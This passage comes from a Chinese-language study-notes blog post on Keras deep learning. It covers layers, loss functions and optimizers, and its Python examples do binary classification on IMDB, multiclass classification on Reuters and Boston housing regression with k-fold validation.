Keras 中，构 建深度学习模型就是将<strong>相互兼容的</strong>多个层拼接在一起，以建立有用的数据变换流程</p><p>这里层兼 容性（layer compatibility）具体指的是每一层只接受特定形状的输入张量，并返回特定形状的输 出张量。看看下面这个例子</p><p><img src="/images/image-20210323210739566.png"></p><p>我们创建了一个层，只接受第一个维度大小为 784 的 2D 张量（第 0 轴是批量维度，其大 小没有指定，因此可以任意取值）作为输入。这个层将返回一个张量，第一个维度的大小变成 了 32。因此，这个层后面只能连接一个接受 32 维向量作为输入的层。在Keras中，不用担心，因为向模型中添加的层都会自动匹配输入层的形状，</p><p><img src="/images/image-20210323210833044.png"></p><h4 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h4><p>深度学习模型是层构成的有向无环图。最常见的例子就是层的线性堆叠，将单一输入映射 为单一输出。但这并不是唯一的结构，会有更多的网络拓扑结构：</p><p>双支头网络，多头网络， Inception 模块，等，选择合适的拓扑结构是很重要的，后续会学到如何选择</p><h4 id="损失函数与优化器"><a href="#损失函数与优化器" class="headerlink" title="损失函数与优化器"></a>损失函数与优化器</h4><p>一旦确定了网络架构，就需要选择损失函数与优化器两个参数，</p><ul><li>损失函数（目标函数）——在训练过程中需要将其最小化。它能够衡量当前任务是否已 成功完成。</li><li>优化器——决定如何基于损失函数对网络进行更新。它执行的是随机梯度下降（SGD） 的某个变体。</li></ul><p>具有多个输出的神经网络可能具有多个损失函数（每个输出对应一个损失函数）。但是，梯度下降过程必须基于单个标量损失值。因此，对于具有多个损失函数的网络，<strong>需要将所有损失 函数取平均</strong>，变为一个标量值</p><h3 id="二分类问题"><a href="#二分类问题" class="headerlink" title="二分类问题"></a>二分类问题</h3><p>使用Keras中的数据集 IMDB,本节使用 IMDB 数据集，它包含来自互联网电影数据库（IMDB）的 50 000 条严重两极分 化的评论。数据集被分为用于训练的 25 000 条评论与用于测试的 25 000 条评论，训练集和测试 集都包含 50% 的正面评论和 50% 的负面评论,它已经过预处理：评论（单词序列） 已经被转换为整数序列，其中每个整数代表字典中的某个单词</p><p>不能将整数序列直接传入神经网络，需要将列表转化为张量，</p><ul><li>可以填充列表使其具有相同的长度，再将列表转换成形状为 (samples, word_indices) 的整数张量，然后网络第一层使用能处理这种整数张量的层</li><li>对列表进行 one-hot 编码，将其转换为 0 和 1 组成的向量。举个例子，序列 [3, 5] 将会 被转换为 10 000 维向量，只有索引为 3 和 5 的元素是 1，其余元素都是 0。然后网络第 一层可以用 Dense 层，它能够处理浮点数向量数据。</li></ul><p>输入数据是向量，而标签是标量（1 和 0），</p><p>带有 relu 激活的全连接层（Dense）的简单堆叠在这种问题上表现的很好，，比如 Dense(16, activation=’relu’)</p><p>传入 Dense 层的参数（16）是该层隐藏单元的个数。一个隐藏单元（hidden unit）是该层 表示空间的一个维度。</p><p>relu叫做激活函数</p><p><img src="/images/image-20210325112302972.png"></p><p>最后需要选择损失函数和优化器</p><p>面对二分类问题，网络输出是一个概率值，网络最后一层使用 sigmoid 激活函数，仅包含一个单元），那么最好使用 binary_ crossentropy（二元交叉熵）损失。这并不是唯一可行的选择，比如你还可以使用 mean_ squared_error（均方误差）。但对于输出概率值的模型，交叉熵（crossentropy）往往是最好 的选择。交叉熵是来自于信息论领域的概念，用于衡量概率分布之间的距离，在这个例子中就 是真实分布与预测值之间的距离</p><p>为了在训练过程中监控模型在前所未见的数据上的精度，需要将原始训练数据留出 10000 个样本作为验证集。</p><p><strong>验证集的作用是用于辅助调剂模型，在跑了一定的轮次后可以通过验证集来确定当前参数是否是优解，如果在验证集上的效果比训练集上差很多，考虑模型是否过拟合了。同时，还可以通过验证集对比不同的模型。</strong></p><p>以下代码为例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> keras<span class="token punctuation">.</span>datasets <span class="token keyword">import</span> imdb    <span class="token comment">#导入数据集</span><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">from</span> keras <span class="token keyword">import</span> models    <span class="token comment">#模型</span><span class="token keyword">from</span> keras <span class="token keyword">import</span> layers    <span class="token comment">#层</span><span class="token keyword">def</span> <span class="token function">div</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    利用简单神经网络实现二分类    :return:    """</span>    <span class="token comment">#读取数据，num_words=10000意思是仅保留训练数据中前 10 000 个最常出现的单词</span>    <span class="token comment">#train_data是训练集特征，train_lables是训练集目标值，test_data是测试集特征值，test_labels是测试机目标值</span>    <span class="token comment">#都是还未经过处理的，也可以直接以x_train等代替</span>    <span class="token punctuation">(</span>train_data<span class="token punctuation">,</span>train_labels<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>test_data<span class="token punctuation">,</span>test_labels<span class="token punctuation">)</span><span class="token operator">=</span> imdb<span class="token punctuation">.</span>load_data<span class="token punctuation">(</span>num_words<span class="token operator">=</span><span class="token number">10000</span><span class="token punctuation">)</span>    <span class="token comment">#print可以看到train_data的类型是列表，不能直接传入神经网络模型，需要进行格式转化</span>    x_train<span class="token operator">=</span>vectorize_sequences<span class="token punctuation">(</span>train_data<span class="token punctuation">)</span>    x_test<span class="token operator">=</span>vectorize_sequences<span class="token punctuation">(</span>test_data<span class="token punctuation">)</span>    y_train <span class="token operator">=</span> np<span class="token punctuation">.</span>asarray<span class="token punctuation">(</span>train_labels<span class="token punctuation">)</span><span class="token punctuation">.</span>astype<span class="token punctuation">(</span><span class="token string">'float32'</span><span class="token punctuation">)</span>    y_test <span class="token operator">=</span> np<span class="token punctuation">.</span>asarray<span class="token punctuation">(</span>test_labels<span class="token punctuation">)</span><span class="token punctuation">.</span>astype<span class="token punctuation">(</span><span class="token string">'float32'</span><span class="token punctuation">)</span>    <span class="token comment">#模型实例化</span>    model <span class="token operator">=</span> models<span class="token punctuation">.</span>Sequential<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#给模型添加层</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">,</span>input_shape<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'sigmoid'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#模型编译，将优化器、损失函数和指标的设置</span>    model<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>optimizer<span class="token operator">=</span><span class="token string">'rmsprop'</span><span class="token punctuation">,</span>loss<span class="token operator">=</span><span class="token string">'binary_crossentropy'</span><span class="token punctuation">,</span>metrics<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'accuracy'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#进行验证集划分，x_val为训练集特征值的训练集划分</span>    x_val <span class="token operator">=</span> x_train<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">10000</span><span class="token punctuation">]</span>    <span class="token comment">#剩余训练集特征值</span>    prac_x_train<span class="token operator">=</span>x_train<span class="token punctuation">[</span><span class="token number">10000</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token comment">#目标值也进行划分</span>    y_val <span class="token operator">=</span> y_train<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">10000</span><span class="token punctuation">]</span>    prac_y_train <span class="token operator">=</span> y_train<span class="token punctuation">[</span><span class="token number">10000</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token comment">#传入数据进行迭代训练</span>    <span class="token comment">#第一个参数为训练集特诊值，第二个为训练集目标值，第三个参数epochs为训练轮数，batch_size为批量中样本个数，validation_data为验证集</span>    predict<span class="token operator">=</span>model<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>prac_x_train<span class="token punctuation">,</span>prac_y_train<span class="token punctuation">,</span>epochs<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span>batch_size<span class="token operator">=</span><span class="token number">512</span><span class="token punctuation">,</span>validation_data<span class="token operator">=</span><span class="token punctuation">(</span>x_val<span class="token punctuation">,</span>y_val<span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment">#进行预测,用于评估模型性能</span>    <span class="token comment">#返回损失值和你选定的指标值（例如，精度accuracy</span>    result<span class="token operator">=</span>model<span class="token punctuation">.</span>evaluate<span class="token punctuation">(</span>x_test<span class="token punctuation">,</span>y_test<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">vectorize_sequences</span><span class="token punctuation">(</span>sequence<span class="token punctuation">,</span>dimention<span class="token operator">=</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    向量化数据,做了一个转化数据格式的作用    :param sequence:传入数据    :param dimention:数量    :return:    """</span>    <span class="token comment">#创建一个大小为(sequence,dimention)的0矩阵</span>    result<span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sequence<span class="token punctuation">)</span><span class="token punctuation">,</span>dimention<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span>se <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>sequence<span class="token punctuation">)</span><span class="token punctuation">:</span>        result<span class="token punctuation">[</span>i<span class="token punctuation">,</span>se<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>    <span class="token keyword">return</span> result<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    div<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行后可得20个轮次的结果</p><p><img src="/images/image-20210325141958867.png"></p><ul><li><p>loss：是网络在训练数据上的损失（loss），</p></li><li><p>accuracy：是网络在 训练数据上的精度（acc）</p></li><li><p>val_loss:验证集的数据损失</p></li><li><p>val_accuracy:验证集的精度</p></li></ul><h3 id="多分类问题"><a href="#多分类问题" class="headerlink" title="多分类问题"></a>多分类问题</h3><p>也是分类问题，但目标值有多个，属于多分类问题，每个数据点只能划分到一个类别， 所以更具体地说，这是<strong>单标签、多分类</strong>，如果每个数据点可以划分到多个类别（主题），那它就是一个<strong>多标签、多分类</strong>问题</p><p>在对数据做处理时，对这次的数据集，路透社数据集，与 IMDB 评论一样，每个样本都是一个整数列表（表示单词索引）</p><p><img src="/images/image-20210325200231333.png"></p><p>这种需要对其使用one_hot编码或者像上一个例子中一样进行转化，，这里直接使用keras中的api对特征值和目标值进行转化：api：</p><p><strong>from keras.utils.np_utils.to_categorical</strong></p><p>完成数据转换后就按照之前的步骤模型定义和搭建神经网络即可，</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">div_mul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    多分类神经网络    :return:    """</span>    <span class="token comment">#导入数据</span>    <span class="token punctuation">(</span>train_data<span class="token punctuation">,</span>train_labels<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>test_data<span class="token punctuation">,</span>test_labels<span class="token punctuation">)</span><span class="token operator">=</span>reuters<span class="token punctuation">.</span>load_data<span class="token punctuation">(</span>num_words<span class="token operator">=</span><span class="token number">10000</span><span class="token punctuation">)</span>    <span class="token comment"># print(train_data[0])</span>    <span class="token comment"># print(test_labels)</span>    <span class="token comment">#数据处理，转化为one_hot编码,直接调用api</span>    <span class="token triple-quoted-string string">"""    这里直接对train_data,test_data调用api会有错误，    因为x_train的格式是类似arry([[list([12.0, 25.0,]), list([20.0, 21.0,])])    这种，不是np.array的形式，需要转化为这种形式才能进行    试验后发现，train_data中每个元素的长度不同，不能直接调api，只能用自己写的10000长度的to one hot     """</span>    <span class="token comment"># x_train = np.array([data for data in train_data])</span>    <span class="token comment"># x_train=to_categorical(x_train.astype('float32'))</span>    <span class="token comment"># x_test=np.array([data for data in test_data])</span>    <span class="token comment"># x_test=to_categorical(x_test.astype('float32'))</span>    x_train <span class="token operator">=</span> vectorize_sequences<span class="token punctuation">(</span>train_data<span class="token punctuation">)</span>    x_test <span class="token operator">=</span> vectorize_sequences<span class="token punctuation">(</span>test_data<span class="token punctuation">)</span>    y_train<span class="token operator">=</span>to_categorical<span class="token punctuation">(</span>train_labels<span class="token punctuation">,</span><span class="token punctuation">)</span>    y_test<span class="token operator">=</span>to_categorical<span class="token punctuation">(</span>test_labels<span class="token punctuation">,</span><span class="token punctuation">)</span>    <span class="token comment">#模型定义,大小64,46的Dense层</span>    <span class="token comment">#网络的最后一层是大小为 46 的 Dense 层。这意味着，对于每个输入样本，网络都会输出一个 46 维向量。这个向量的每个元素（即每个维度）代表不同的输出类别</span>    <span class="token comment">#  最后一层使用了 softmax 激活。,网络将输出在 46个不同输出类别上的概率分布——对于每一个输入样本，网络都会输出一个 46 维向量，</span>    <span class="token comment"># 其中 output[i] 是样本属于第 i 个类别的概率。46 个概率的总和为 1</span>    model<span class="token operator">=</span>models<span class="token punctuation">.</span>Sequential<span class="token punctuation">(</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">,</span>input_shape<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'softmax'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#对于这个例子，最好的损失函数是 categorical_crossentropy（分类交叉熵）。它用于</span>    <span class="token comment">#衡量两个概率分布之间的距离，这里两个概率分布分别是网络输出的概率分布和标签的真实分</span>    <span class="token comment">#布。通过将这两个分布的距离最小化，训练网络可使输出结果尽可能接近真实标签。</span>    <span class="token comment">#编译模型</span>    model<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>optimizer<span class="token operator">=</span><span class="token string">'rmsprop'</span><span class="token punctuation">,</span>loss<span class="token operator">=</span><span class="token string">'categorical_crossentropy'</span><span class="token punctuation">,</span>metrics<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'accuracy'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#验证集划分</span>    x_val_train <span class="token operator">=</span> x_train<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">1000</span><span class="token punctuation">]</span>    x_train <span class="token operator">=</span> x_train<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    y_val_train <span class="token operator">=</span> y_train<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">1000</span><span class="token punctuation">]</span>    y_train <span class="token operator">=</span> y_train<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token comment">#传入训练数据</span>    result<span class="token operator">=</span>model<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span>y_train<span class="token punctuation">,</span>epochs<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span>batch_size<span class="token operator">=</span><span class="token number">512</span><span class="token punctuation">,</span>validation_data<span class="token operator">=</span><span class="token punctuation">(</span>x_val_train<span class="token punctuation">,</span>y_val_train<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"测试集预测结果"</span><span class="token punctuation">,</span>model<span class="token punctuation">.</span>evaluate<span class="token punctuation">(</span>x_test<span class="token punctuation">,</span>y_test<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于3个Dense层，其大小都是64或46，是大于等于目标值，标签值的46的。因为最终输出是 46 维的，因此中间层的隐藏单元个数不应该比 46 小太多，如果中间层的维度小于46，，就会造成信息瓶颈，降低准确值</p><p><strong>原因：试图将大量信息（这些信息足够恢复 46 个类别的分割超平面）压缩到维度很小的中间空间。网 络能够将大部分必要信息塞入这个四维表示中，但并不是全部信息</strong></p><h3 id="回归问题"><a href="#回归问题" class="headerlink" title="回归问题"></a>回归问题</h3><p>上述两个例子都是分类问题，在之前的机器学习中也通过knn，朴素贝叶斯，决策树随机森林进行了分类，回归问题也是机器学习中重要的问题之一，分类问题的数据使用的<strong>离散型</strong>，而回归问题的数据是<strong>连续型</strong>，</p><p>对这个数据，我们需要进行标准化处理，可以调用api，也可以自己写一下，</p><p>对于回归问题的模型构建，其优化器一般使用rmsprop,而损失函数一般使用<strong>是mse 损失函数，即均方误差</strong>，预测值与 目标值之差的平方。这是回归问题常用的损失函数，监控指标为<strong>平均绝对误差，MAE</strong>，它是预测值 与目标值之差的绝对值。、</p><p><strong>对于数据集较少的情况，验证集的划分需要用到交叉验证</strong>，之前有过记录</p><p><img src="/images/image-20210329202906904.png"></p><p>通过交叉验证来查看mae等参数，进行调参，最后得到合适的参数，再在所有的数据集上训练，最后通过训练除的模型来进行预测</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">regress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    回归问题,波士顿房价    :return:None    """</span>    <span class="token comment">#读入数据</span>    <span class="token punctuation">(</span>x_train<span class="token punctuation">,</span>y_train<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>x_test<span class="token punctuation">,</span>y_test<span class="token punctuation">)</span><span class="token operator">=</span>boston_housing<span class="token punctuation">.</span>load_data<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#需要对数据进行标准化，可以调用sklearn的api，也可以自己写一个</span>    <span class="token comment"># 平均数</span>    mean <span class="token operator">=</span> x_train<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment">#标准差i</span>    std <span class="token operator">=</span> x_train<span class="token punctuation">.</span>std<span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    x_train <span class="token operator">-=</span>mean    x_train <span class="token operator">/=</span>std    x_test<span class="token operator">-=</span>mean    x_test <span class="token operator">/=</span>std    <span class="token comment">#因为要多次实例化同一个模型，所以将模型定义放入函数def_model中</span>    <span class="token comment">#手动实现k折交叉验证</span>    k<span class="token operator">=</span><span class="token number">3</span>    <span class="token comment">#验证集长度</span>    num_of_val <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>x_train<span class="token punctuation">)</span><span class="token operator">//</span>k    <span class="token comment">#训练轮次</span>    num_epochs <span class="token operator">=</span> <span class="token number">80</span>    <span class="token comment">#训练结果</span>    all_score<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#进行k折交叉验证</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">"折"</span><span class="token punctuation">)</span>        <span class="token comment">#验证集特征值</span>        val_x <span class="token operator">=</span> x_train<span class="token punctuation">[</span>i<span class="token operator">*</span>num_of_val<span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>num_of_val<span class="token punctuation">]</span>        <span class="token comment">#验证集目标值</span>        val_y <span class="token operator">=</span> y_train<span class="token punctuation">[</span>i<span class="token operator">*</span>num_of_val<span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>num_of_val<span class="token punctuation">]</span>        <span class="token comment">#数据集,用np将其聚合起来</span>        val_x_train <span class="token operator">=</span> np<span class="token punctuation">.</span>concatenate<span class="token punctuation">(</span>            <span class="token punctuation">[</span>x_train<span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token operator">*</span>num_of_val<span class="token punctuation">]</span><span class="token punctuation">,</span>x_train<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>num_of_val<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">]</span>            <span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token number">0</span>        <span class="token punctuation">)</span>        val_y_train <span class="token operator">=</span> np<span class="token punctuation">.</span>concatenate<span class="token punctuation">(</span>            <span class="token punctuation">[</span>y_train<span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token operator">*</span>num_of_val<span class="token punctuation">]</span><span class="token punctuation">,</span>y_train<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>num_of_val<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">]</span>            <span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token number">0</span>        <span class="token punctuation">)</span>        model <span class="token operator">=</span> def_model<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># 模型训练</span>        history <span class="token operator">=</span> model<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>val_x_train<span class="token punctuation">,</span>val_y_train<span class="token punctuation">,</span>validation_data<span class="token operator">=</span><span class="token punctuation">(</span>val_x<span class="token punctuation">,</span>val_y<span class="token punctuation">)</span><span class="token punctuation">,</span>epochs<span class="token operator">=</span>num_epochs<span class="token punctuation">,</span>batch_size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment">#在验证集上进行预测</span>        mse<span class="token punctuation">,</span>mae <span class="token operator">=</span> model<span class="token punctuation">.</span>evaluate<span class="token punctuation">(</span>val_x<span class="token punctuation">,</span>val_y<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>mae<span class="token punctuation">)</span>        <span class="token comment">#最终通过k折交叉验证找到合适的参数，在全部训练集上进行训练，得到最终模型，进行预测</span>        model1<span class="token operator">=</span>def_model<span class="token punctuation">(</span><span class="token punctuation">)</span>        model1<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span>y_train<span class="token punctuation">,</span>epochs<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>batch_size<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span>        fin_mse<span class="token punctuation">,</span>fin_mae<span class="token operator">=</span>model1<span class="token punctuation">.</span>evaluate<span class="token punctuation">(</span>x_test<span class="token punctuation">,</span>y_test<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">def_model</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    回归模型构建    :return: model    """</span>    <span class="token comment">#实例化对象</span>    model <span class="token operator">=</span> models<span class="token punctuation">.</span>Sequential<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 现在模型就会以尺寸为 (*, 13) 的数组作为输入，</span>    <span class="token comment"># 其输出数组的尺寸为 (*, 64)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">,</span>input_shape<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span>activation<span class="token operator">=</span><span class="token string">'relu'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#网络的最后一层只有一个单元，没有激活，是一个线性层。这是标量回归（标量回归是预测单一连续值的回归）的典型设置</span>    <span class="token comment"># 添加激活函数将会限制输出范围,这里最后一层是纯线性的，所以网络可以学会预测任意范围内的值</span>    model<span class="token punctuation">.</span>add<span class="token punctuation">(</span>layers<span class="token punctuation">.</span>Dense<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#损失函数mse，即均方误差，预测值与</span>    <span class="token comment"># 目标值之差的平方。这是回归问题常用的损失函数</span>    <span class="token comment"># 在训练过程中还监控一个新指标：平均绝对误差，它是预测值与目标值之差的绝对值</span>    model<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>optimizer<span class="token operator">=</span><span class="token string">'rmsprop'</span><span class="token punctuation">,</span>loss<span class="token operator">=</span><span class="token string">'mse'</span><span class="token punctuation">,</span>metrics<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'mae'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> model<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    regress<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>回归问题使用的损失函数与分类问题不同。回归常用的损失函数是均方误差（MSE），同样，回归问题使用的评估指标也与分类问题不同。显而易见，精度的概念不适用于回 归问题。常见的回归指标是平均绝对误差（MAE）。</strong></p><p>如果输入数据的特征具有不同的取值范围，应该先进行预处理，对每个特征单独进行 缩放，进行标准化处理，如果可用的数据很少，使用 K 折交叉验证可以可靠地评估模型。</p><p>如果可用的训练数据很少，最好使用隐藏层较少（通常只有一到两个）的小型网络，以 避免严重的过拟合。</p><p><strong><em>到目前，机器学习中的分类以及回归问题都以神经网络的方式进行了实现，对其进行一个简要的总结</em></strong></p><ul><li><p> 在将原始数据输入神经网络之前，通常需要对其进行预处理。</p></li><li><p>如果数据特征具有不同的取值范围，那么需要进行预处理，将每个特征单独缩放。</p></li><li><p>随着训练的进行，神经网络最终会过拟合，并在前所未见的数据上得到更差的结果。 </p></li><li><p>如果训练数据不是很多，应该使用只有一两个隐藏层的小型网络，以避免严重的过拟合。</p></li><li><p>如果数据被分为多个类别，那么中间层过小可能会导致信息瓶颈。</p></li><li><p>回归问题使用的损失函数和评估指标都与分类问题不同。</p></li><li><p>如果要处理的数据很少，K 折验证有助于可靠地评估模型</p></li></ul><h2 id="深度学习数据预处理"><a href="#深度学习数据预处理" class="headerlink" title="深度学习数据预处理"></a>深度学习数据预处理</h2><p>之前对于机器学习的处理中，已经了解到了数据处理，特征工程的重要性，对于模型的准确率是很重要的，同样的，在深度学习中，对数据的预处理会对神经模型的准确率有很大的影响。</p><h3 id="神经网络的数据预处理"><a href="#神经网络的数据预处理" class="headerlink" 